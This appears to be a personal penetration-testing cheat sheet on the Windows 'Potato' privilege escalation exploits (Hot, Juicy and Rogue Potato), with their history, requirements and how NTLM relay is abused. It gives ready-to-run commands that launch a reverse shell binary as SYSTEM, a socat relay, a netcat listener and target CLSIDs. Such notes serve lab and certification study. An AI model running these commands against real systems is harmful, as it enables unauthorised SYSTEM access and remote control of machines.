# Potatoes
```default
                         ,d                 ,d                
                         88                 88                
8b,dPPYba,   ,adPPYba, MM88MMM ,adPPYYba, MM88MMM ,adPPYba,   
88P'    "8a a8"     "8a  88    ""     `Y8   88   a8"     "8a  
88       d8 8b       d8  88    ,adPPPPP88   88   8b       d8  
88b,   ,a8" "8a,   ,a8"  88,   88,    ,88   88,  "8a,   ,a8"  
88`YbbdP"'   `"YbbdP"'   "Y888 `"8bbdP"Y8   "Y888 `"YbbdP"'   
88                                                            
88
```

The potato exploits are a series of **privilege escalation** exploits. A wide variety of Windows versions are vulnerable.

**JuicyPotato** tends to work most often, so if the conditions fit, try that one first. On newer Win10 versions try **Rogue Potato** (current state 2020).

Here is a list of the Potato Exploits, their release dates and the authors I could identify:

* **Hot Potato** - January 2016 - Stephen Breen
* **Rotten Potato** - September 2016 - Stephen Breen, Chris Mallz
* **Rotten Potato NG** (C++ rewrite) - December 2017 - Same authors?
* **Juicy Potato** - August 2018 - Andrea Pierini, Giuseppe Trotta
* **Rogue Potato** - May 2020 - Antonio Cocomazzi

I am not really an expert on this topic, so all the explanations below should be taken with caution. They are just my own attempts at figuring out how these work. Please tell me if something is wrong.


## Hot Potato

* Source: https://github.com/foxglovesec/Potato
* Reference: https://foxglovesecurity.com/2016/01/16/hot-potato/

**Applicable:** Windows 7, 8, early versions of Windows 10 and server counterparts Server 2008, Server 2012.

**Requirements:** See Explanation section.

```default
.\potato.exe -ip <local_windows_ip> -cmd "C:\Privesc\reverseshell.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

Use the IP of the machine you are attacking (the one this runs on).

Expected result is a SYSTEM shell.

It is less stable than the other potatoes. Also the UDP spam might cause some problems. I have successfully tested this exploit, but only in my lab.


### Explanation

This is a NBNS (NetBIOS Name Service) UDP flooding attack with NTLM relay.

Many Windows applications will look for a network proxy configuration on "http://wpad/wpad.dat". When the machine asks the network for the address of "WPAD", or "WPAD.DOMAIN.TLD" via NBNS, then the local potato binary spams UDP answers quicker than any other host in the network could, telling the machine that localhost (and specifically our potato server) is the address of the WPAD proxy. Now the potato binary can set up an HTTP proxy server and relay NTLM authentication attempts sent by the machine. With the captured NTLM hash we can then establish a shell via the local SMB service.

DNS and the local hosts file take precedent over NBNS, so DNS needs to be disabled.

If your network has a DNS entry for "WPAD" already, then you can try "-disable_exhaust false". This should cause the DNS lookup to fail and it should fallback to NBNS. This seems to work pretty reliably on Windows 7.


## Juicy Potato

* Source: https://github.com/ohpe/juicy-potato
* Reference (Rotten Potato): https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/

**Applicable**: Windows 7, 8, early versions of Windows 10 and server counterparts Server 2008, Server 2012. Requires a service account with token impersonation privileges.

**Requirements:** You have a shell as a service account with **AT LEAST ONE** of the following privileges:

* SeAssignPrimaryTokenPrivilege
* SeImpersonatePrivilege

Check with `whoami /priv`.

These tend to be set to "enabled" for most Service accounts, which makes this a common attack vector.

```default
.\JuicyPotato.exe -l 1337 -p C:\PrivEsc\reverseshell.exe -t * -c {5B3E6773-3A99-4A3D-8096-7765DD11785C}
```

I think the user of the shell you receive depends on the CLSID you used, but in general you should receive a SYSTEM shell.


### Explanation

**Juicy Potato** is an extended version of **Rotten Potato** (more specifically RP NG), but unlike RP NG it works on a wider variety of windows versions. The underlying exploitation method is the same for both Rotten and Juicy Potato, so I am only listing the newer Juicy version here.

Similar to the Hot Potato exploit, this exploit is an NTLM relay attack. It tricks the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to a TCP endpoint we control (compared to the fake proxy used in Hot Potato).

### CLSID's

These will differ depending on the OS you are exploiting.

Known CLSID's as list:

* http://ohpe.it/juicy-potato/CLSID/

How do you find CLSIDs if none from the list work?

Execute the GetCLSID.ps1 powershell script on the target.

http://ohpe.it/juicy-potato/CLSID/GetCLSID.ps1


#### Example CLSIDs
```default
Win7 Professional SP1 - {F087771F-D74F-4C1A-BB8A-E16ACA9124EA}
Win7 Enterprise - {03ca98d6-ff5d-49b8-abc6-03dd84127020}
Win8.1 Enterprise - {eff7f153-1c97-417a-b633-fede6683a939}
Win10 Enterprise - {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
Win10 Pro - {5B3E6773-3A99-4A3D-8096-7765DD11785C}
WinServer2008 R2 Enterprise - {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
WinServer2012 Datacenter - {e60687f7-01a1-40aa-86ac-db1cbf673334}
WinServer2016 Standard - {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

## Rogue Potato

* Source: https://github.com/antonioCoco/RoguePotato

**Applicable**: Seems to only work with x64? So far successfully tested on Win10 x64. 

Unlike Hot and Rotten/Juicy, this exploit should still work in newer Windows 10 installations.

**Requirements:** Like Rotten/Juicy Potato this exploit requires a service account with **AT LEAST ONE** of the following privileges: 

* SeAssignPrimaryTokenPrivilege
* SeImpersonatePrivilege


### HowTo

Create a reverse shell binary with msvenom and transfer it together with the roguepotato exploit to the target.

On Kali set up a relay:
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<target_ip>:9999
```

Also set up a listener for the reverse shell obviously (e.g. `sudo nc -vlnp 53`).

On the Windows target:

```default
.\RoguePotato.exe -r <your_own_kali_machine_ip> -l 9999 -e "C:\PrivEsc\reverseshell.exe"
```

You should receive a SYSTEM shell.
